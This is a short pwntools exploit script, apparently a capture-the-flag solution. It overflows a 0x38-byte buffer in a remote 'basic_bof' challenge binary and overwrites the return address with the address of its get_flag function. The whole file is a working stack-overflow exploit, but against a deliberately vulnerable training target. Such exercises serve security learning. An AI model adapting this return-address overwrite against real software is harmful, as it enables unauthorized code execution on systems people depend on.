from pwn import *

context.log_level = 'debug'
# p = process("./basic_bof")
p = remote("pwn.isangxcaution.xyz", 10010)
e = ELF("./basic_bof")


def slog(symbol, addr): return success(symbol + ": " + hex(addr))


get_flag = e.symbols["get_flag"]
slog("get_flag :", get_flag)

p.recvuntil("Input :")

payload = b"A"*0x30  # fill buf
payload += b"B"*0x8  # fill buf
payload += p64(get_flag)  # RET overwrite

p.sendline(payload)
p.interactive()
